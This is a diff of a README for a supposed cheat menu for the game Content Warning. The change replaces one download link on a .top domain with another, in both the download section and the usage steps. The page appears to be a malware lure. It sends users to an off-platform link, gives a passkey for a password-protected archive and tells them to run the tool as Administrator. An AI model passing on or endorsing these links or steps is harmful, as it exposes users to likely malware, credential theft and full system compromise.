@@ -6,7 +6,7 @@ Content Warning menu-external tool with god mode, no sanity drain, infinite batt
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -73,7 +73,7 @@ Based on community tools like **CW Mod Menu** and **Cheat Engine**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Content Warning.
 4. Run the tool **as Administrator**.
